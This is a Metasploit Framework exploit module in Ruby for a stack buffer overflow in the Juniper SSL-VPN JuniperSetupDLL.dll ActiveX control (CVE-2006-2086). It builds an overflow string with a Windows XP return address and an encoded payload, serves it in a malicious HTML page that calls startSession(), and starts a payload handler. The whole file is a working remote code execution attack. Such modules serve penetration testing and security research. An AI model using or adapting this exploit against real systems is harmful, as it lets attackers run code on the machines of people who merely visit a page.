##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Juniper SSL-VPN IVE JuniperSetupDLL.dll ActiveX Control Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the JuniperSetupDLL.dll
				library which is called by the JuniperSetup.ocx ActiveX	control,
				as part of the Juniper SSL-VPN (IVE) appliance. By specifying an
				overly long string to the ProductName object parameter, the stack
				is overwritten.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'patrick',
			'References'     =>
				[
					[ 'CVE', '2006-2086' ],
					[ 'OSVDB', '25001' ],
					[ 'BID', '17712' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-04/0743.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'		=>
				{
					'Space'		=> 1024,
					'BadChars'	=> "\x00\x0a\x0d\x20<>()\"\\\';@\#\%\`",
					'StackAdjustment' => -3500,
				},
			'Platform'		=> 'win',
			'Targets'		=>
				[
					[ 'Windows XP Pro SP3 English',	{ 'Ret' => 0x77ae7f99 } ],# crypt32.dll jmp esp
					[ 'Debugging',			{ 'Ret' => 0x44434241 } ],
				],
			'DisclosureDate' => 'Apr 26 2006',
			'DefaultTarget' => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize
		vname = rand_text_alpha(rand(100) + 1)

		# Build the exploit buffer
		sploit = rand_text_alpha(2200)
		sploit[220, 4] = [target['Ret']].pack('V')
		sploit[240, payload.encoded.length] = payload.encoded

		# Build out the message
		content = %Q|
			<html>
			<object classid="CLSID:E5F5D008-DD2C-4D32-977D-1A0ADF03058B" id="#{vname}">
			<PARAM NAME="ProductName" VALUE="#{sploit}">
			</object>
			<script language="javascript">
			#{vname}.startSession();
			</script>
			</html>
			|

		print_status("Sending #{self.name}")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
